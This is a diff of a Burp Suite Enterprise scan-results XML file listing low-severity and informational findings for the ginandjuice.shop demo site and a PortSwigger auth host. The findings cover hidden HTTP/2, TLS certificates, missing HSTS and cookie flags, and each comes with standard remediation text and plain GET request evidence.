@@ -1,12 +1,79 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
-<testsuites failures="2" name="Scan results" tests="7">
-    <testsuite failures="0" name="https://auth.management-prod.cloud.portswigger.com:443/" tests="1">
+<testsuites failures="29" name="Scan results" tests="84">
+    <testsuite failures="0" name="http://ginandjuice.shop:80/" tests="1">
         <testcase name="No issues were identified"/>
     </testsuite>
-    <testsuite failures="0" name="https://auth.management-prod.cloud.portswigger.com:443/robots.txt" tests="1">
-        <testcase name="No issues were identified"/>
-    </testsuite>
-    <testsuite failures="2" name="https://auth.management-prod.cloud.portswigger.com:443/web" tests="2">
+    <testsuite failures="2" name="https://auth.management-prod.cloud.portswigger.com:443/" tests="2">
+        <testcase name="Hidden HTTP 2">
+            <failure message="Hidden HTTP 2 found at https://auth.management-prod.cloud.portswigger.com/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://auth.management-prod.cloud.portswigger.com
+
+Path: /
+
+
+Issue Detail
+The server did not list h2 in the ALPN field during the TLS handshake. However, when a HTTP/2 request was sent over the TLS connection, a HTTP/2 response was received. This indicates that the server does support HTTP/2, despite not advertising it.
+
+Issue Background
+
+Clients that support HTTP/2 typically default to HTTP/1.1, and only use HTTP/2 if the server advertises support for it via the ALPN field during the TLS handshake.
+
+
+
+Some misconfigured servers that do support HTTP/2 fail to advertise this, making it appear as though they only support HTTP/1.1. This can lead to people overlooking viable HTTP/2 attack surface and missing associated vulnerabilities, such as HTTP/2 downgrade-based request smuggling.
+
+
+
+Issue Remediation
+
+If you want to use HTTP/2, make sure the server is configured to advertise it correctly. Otherwise, consider fully disabling it server-side to reduce unnecessary attack surface.
+
+
+
+Evidence
+Request:
+GET / HTTP/2
+Host: auth.management-prod.cloud.portswigger.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+Response:
+HTTP/2 400 Bad Request
+Content-Type: text/plain; charset=utf-8
+X-Content-Type-Options: nosniff
+Content-Length: 51
+Date: Thu, 07 Sep 2023 10:59:30 GMT
+
+request header "Connection" is not valid in HTTP/2
+
+
+
+
+References
+    
+- HTTP/2: The Sequel is Always Worse (https://portswigger.net/research/http2)
+
+
+
+Vulnerability Classifications
+    
+- CWE-912: Hidden Functionality (https://cwe.mitre.org/data/definitions/912.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
         <testcase name="TLS certificate">
             <failure message="TLS certificate found at https://auth.management-prod.cloud.portswigger.com/" type="Low"><![CDATA[
 Severity: Low
@@ -73,77 +140,3299 @@ Vulnerability Classifications
 Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
 ]]></failure>
         </testcase>
-        <testcase name="Hidden HTTP 2">
-            <failure message="Hidden HTTP 2 found at https://auth.management-prod.cloud.portswigger.com/web" type="Info"><![CDATA[
+    </testsuite>
+    <testsuite failures="9" name="https://ginandjuice.shop:443/" tests="9">
+        <testcase name="TLS certificate">
+            <failure message="TLS certificate found at https://ginandjuice.shop/" type="Info"><![CDATA[
 Severity: Info
 
 Confidence: Certain
 
-Host: https://auth.management-prod.cloud.portswigger.com
+Host: https://ginandjuice.shop
 
-Path: /web
+Path: /
 
 
 Issue Detail
-The server did not list h2 in the ALPN field during the TLS handshake. However, when a HTTP/2 request was sent over the TLS connection, a HTTP/2 response was received. This indicates that the server does support HTTP/2, despite not advertising it.
+The server presented a valid, trusted TLS certificate. This issue is purely informational.
+
+The server presented the following certificates:
+
+
+Server certificate
+Issued to: ginandjuice.shop, *.ginandjuice.shop 
+Issued by: Amazon RSA 2048 M02 
+Valid from: Sun Feb 19 00:00:00 UTC 2023 
+Valid to: Wed Mar 20 23:59:59 UTC 2024 
+
+Certificate chain #1
+Issued to: Amazon RSA 2048 M02 
+Issued by: Amazon Root CA 1 
+Valid from: Tue Aug 23 22:25:30 UTC 2022 
+Valid to: Fri Aug 23 22:25:30 UTC 2030 
+
+Certificate chain #2
+Issued to: Amazon Root CA 1 
+Issued by: Starfield Services Root Certificate Authority - G2 
+Valid from: Mon May 25 12:00:00 UTC 2015 
+Valid to: Thu Dec 31 01:00:00 UTC 2037 
+
+Certificate chain #3
+Issued to: Starfield Services Root Certificate Authority - G2 
+Issued by: Starfield Class 2 Certification Authority 
+Valid from: Wed Sep 02 00:00:00 UTC 2009 
+Valid to: Wed Jun 28 17:39:16 UTC 2034 
+
+Certificate chain #4
+Issued to: Starfield Class 2 Certification Authority 
+Issued by: Starfield Class 2 Certification Authority 
+Valid from: Tue Jun 29 17:39:16 UTC 2004 
+Valid to: Thu Jun 29 17:39:16 UTC 2034 
+
 
 Issue Background
+TLS (or SSL) helps to protect the confidentiality and integrity of information in transit between the browser and server, and to provide authentication of the server's identity. To serve this purpose, the server must present an TLS certificate that is valid for the server's hostname, is issued by a trusted authority and is valid for the current date. If any one of these requirements is not met, TLS connections to the server will not provide the full protection for which TLS is designed.
 
-Clients that support HTTP/2 typically default to HTTP/1.1, and only use HTTP/2 if the server advertises support for it via the ALPN field during the TLS handshake.
-
-
-
-Some misconfigured servers that do support HTTP/2 fail to advertise this, making it appear as though they only support HTTP/1.1. This can lead to people overlooking viable HTTP/2 attack surface and missing associated vulnerabilities, such as HTTP/2 downgrade-based request smuggling.
-
-
-
-Issue Remediation
-
-If you want to use HTTP/2, make sure the server is configured to advertise it correctly. Otherwise, consider fully disabling it server-side to reduce unnecessary attack surface.
-
-
-
-Evidence
-Request:
-GET /web HTTP/2
-Host: auth.management-prod.cloud.portswigger.com
-Accept-Encoding: gzip, deflate
-Accept: */*
-Accept-Language: en-US;q=0.9,en;q=0.8
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Connection: close
-Cache-Control: max-age=0
-Referer: https://auth.management-prod.cloud.portswigger.com/
-
-
-
-Response:
-HTTP/2 400 Bad Request
-Content-Type: text/plain; charset=utf-8
-X-Content-Type-Options: nosniff
-Content-Length: 51
-Date: Fri, 01 Sep 2023 12:18:47 GMT
-
-request header "Connection" is not valid in HTTP/2
-
-
+It should be noted that various attacks exist against TLS in general, and in the context of HTTPS web connections in particular. It may be possible for a determined and suitably-positioned attacker to compromise TLS connections without user detection even when a valid TLS certificate is used. 
 
 
 References
-    
-- HTTP/2: The Sequel is Always Worse (https://portswigger.net/research/http2)
 
+- SSL/TLS Configuration Guide (https://wiki.mozilla.org/Security/Server_Side_TLS)
 
 
 Vulnerability Classifications
-    
-- CWE-912: Hidden Functionality (https://cwe.mitre.org/data/definitions/912.html)
+
+- CWE-295: Improper Certificate Validation (https://cwe.mitre.org/data/definitions/295.html)
+
+- CWE-326: Inadequate Encryption Strength (https://cwe.mitre.org/data/definitions/326.html)
+
+- CWE-327: Use of a Broken or Risky Cryptographic Algorithm (https://cwe.mitre.org/data/definitions/327.html)
 
 
 
 Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
 ]]></failure>
         </testcase>
+        <testcase name="Strict transport security not enforced">
+            <failure message="Strict transport security not enforced found at https://ginandjuice.shop/" type="Low"><![CDATA[
+Severity: Low
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+This issue was found in multiple locations under the reported path.
+
+Issue Background
+ The application fails to prevent users from connecting  to it over unencrypted connections.  An attacker able to modify a legitimate user's network traffic could bypass the application's use of SSL/TLS encryption, and use the application as a platform for attacks against its users. This attack is performed by rewriting HTTPS links as HTTP, so that if a targeted user follows a link to the site from an HTTP page, their browser never attempts to use an encrypted connection. The sslstrip tool  automates this process. 
+
+
+To exploit this vulnerability, an attacker must be suitably positioned to intercept and modify the victim's network traffic.This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure. 
+
+
+Issue Remediation
+The application should instruct web browsers to only access the application using HTTPS. To do this, enable HTTP Strict Transport Security (HSTS) by adding a response header with the name 'Strict-Transport-Security' and the value 'max-age=expireTime', where expireTime is the time in seconds that browsers should remember that the site should only be accessed using HTTPS. Consider adding the 'includeSubDomains' flag if appropriate.
+
+Note that because HSTS is a "trust on first use" (TOFU) protocol, a user who has never accessed the application will never have seen the HSTS header, and will therefore still be vulnerable to SSL stripping attacks. To mitigate this risk, you can optionally add the 'preload' flag to the HSTS header, and submit the domain for review by browser vendors.
+
+
+Evidence
+Request:
+GET / HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:22 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Set-Cookie: AWSALB=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/
+Set-Cookie: AWSALBCORS=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=fDNmZgyGLRpm6ztQh5D98FlnnK1PnZW8; Secure; HttpOnly; SameSite=None
+X-Backend: 34c34acf-1989-4fa4-8141-e1982bbd3217
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+
+
+References
+
+- HTTP Strict Transport Security (https://developer.mozilla.org/en-US/docs/Web/Security/HTTP_strict_transport_security)
+
+- sslstrip (https://github.com/moxie0/sslstrip)
+
+- HSTS Preload Form (https://hstspreload.appspot.com/)
+
+
+
+Vulnerability Classifications
+
+- CWE-523: Unprotected Transport of Credentials (https://cwe.mitre.org/data/definitions/523.html)
+
+- CAPEC-94: Man in the Middle Attack (https://capec.mitre.org/data/definitions/94.html)
+
+- CAPEC-157: Sniffing Attacks (https://capec.mitre.org/data/definitions/157.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="TLS cookie without secure flag set">
+            <failure message="TLS cookie without secure flag set found at https://ginandjuice.shop/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+The following cookie was issued by the application and does not have the secure flag set:
+- AWSALB
+The cookie does not appear to contain a session token, which may reduce the risk associated with this issue. You should review the contents of the cookie to determine its function.This issue was found in multiple locations under the reported path.
+
+Issue Background
+If the secure flag is set on a cookie, then browsers will not submit the cookie in any requests that use an unencrypted HTTP connection, thereby preventing the cookie from being trivially intercepted by an attacker monitoring network traffic. If the secure flag is not set, then the cookie will be transmitted in clear-text if the user visits any HTTP URLs within the cookie's scope. An attacker may be able to induce this event by feeding a user suitable links, either directly or via another web site. Even if the domain that issued the cookie does not host any content that is accessed over HTTP, an attacker may be able to use links of the form http://example.com:443/ to perform the same attack.
+
+To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.
+
+
+Issue Remediation
+The secure flag should be set on all cookies that are used for transmitting sensitive data when accessing content over HTTPS. If cookies are used to transmit session tokens, then areas of the application that are accessed over HTTPS should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications.
+
+
+Evidence
+Request 1:
+GET / HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:22 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Set-Cookie: AWSALB=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/
+Set-Cookie: AWSALBCORS=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=fDNmZgyGLRpm6ztQh5D98FlnnK1PnZW8; Secure; HttpOnly; SameSite=None
+X-Backend: 34c34acf-1989-4fa4-8141-e1982bbd3217
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 2:
+GET /about HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; AWSALBCORS=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; session=9efVrrELtv7F9ETg6SQINlSh2Z3wjpPB
+
+
+
+Response 2:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11166
+Set-Cookie: AWSALB=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/
+Set-Cookie: AWSALBCORS=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/; SameSite=None; Secure
+X-Backend: e7a902ee-3367-41d2-b8f7-3a27ac1bb398
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 3:
+GET /blog HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; AWSALBCORS=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; session=zh0rKIoJluLGpUI6Gy8ZOkDc7ETp2G74
+
+
+
+Response 3:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:59:21 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10923
+Set-Cookie: AWSALB=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/
+Set-Cookie: AWSALBCORS=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+
+
+Vulnerability Classifications
+
+- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute (https://cwe.mitre.org/data/definitions/614.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Cookie without HttpOnly flag set">
+            <failure message="Cookie without HttpOnly flag set found at https://ginandjuice.shop/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+The following cookie was issued by the application and does not have the HttpOnly flag set:
+- AWSALB
+The cookie does not appear to contain a session token, which may reduce the risk associated with this issue. You should review the contents of the cookie to determine its function.This issue was found in multiple locations under the reported path.
+
+Issue Background
+If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.
+
+
+Issue Remediation
+There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.
+
+You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. 
+
+
+Evidence
+Request 1:
+GET / HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:22 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Set-Cookie: AWSALB=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/
+Set-Cookie: AWSALBCORS=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=fDNmZgyGLRpm6ztQh5D98FlnnK1PnZW8; Secure; HttpOnly; SameSite=None
+X-Backend: 34c34acf-1989-4fa4-8141-e1982bbd3217
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 2:
+GET /about HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; AWSALBCORS=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; session=9efVrrELtv7F9ETg6SQINlSh2Z3wjpPB
+
+
+
+Response 2:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11166
+Set-Cookie: AWSALB=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/
+Set-Cookie: AWSALBCORS=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/; SameSite=None; Secure
+X-Backend: e7a902ee-3367-41d2-b8f7-3a27ac1bb398
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 3:
+GET /blog HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; AWSALBCORS=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; session=zh0rKIoJluLGpUI6Gy8ZOkDc7ETp2G74
+
+
+
+Response 3:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:59:21 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10923
+Set-Cookie: AWSALB=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/
+Set-Cookie: AWSALBCORS=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+
+
+References
+
+- Web Security Academy: Exploiting XSS vulnerabilities (https://portswigger.net/web-security/cross-site-scripting/exploiting)
+
+- HttpOnly effectiveness (https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly)
+
+
+
+Vulnerability Classifications
+
+- CWE-16: Configuration (https://cwe.mitre.org/data/definitions/16.html)
+
+- CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies (https://capec.mitre.org/data/definitions/31.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Cookie without HttpOnly flag set">
+            <failure message="Cookie without HttpOnly flag set found at https://ginandjuice.shop/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+The following cookie was issued by the application and does not have the HttpOnly flag set:
+- AWSALBCORS
+The cookie does not appear to contain a session token, which may reduce the risk associated with this issue. You should review the contents of the cookie to determine its function.This issue was found in multiple locations under the reported path.
+
+Issue Background
+If the HttpOnly attribute is set on a cookie, then the cookie's value cannot be read or set by client-side JavaScript. This measure makes certain client-side attacks, such as cross-site scripting, slightly harder to exploit by preventing them from trivially capturing the cookie's value via an injected script.
+
+
+Issue Remediation
+There is usually no good reason not to set the HttpOnly flag on all cookies. Unless you specifically require legitimate client-side scripts within your application to read or set a cookie's value, you should set the HttpOnly flag by including this attribute within the relevant Set-cookie directive.
+
+You should be aware that the restrictions imposed by the HttpOnly flag can potentially be circumvented in some circumstances, and that numerous other serious attacks can be delivered by client-side script injection, aside from simple cookie stealing. 
+
+
+Evidence
+Request 1:
+GET / HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:22 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Set-Cookie: AWSALB=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/
+Set-Cookie: AWSALBCORS=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=fDNmZgyGLRpm6ztQh5D98FlnnK1PnZW8; Secure; HttpOnly; SameSite=None
+X-Backend: 34c34acf-1989-4fa4-8141-e1982bbd3217
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 2:
+GET /about HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
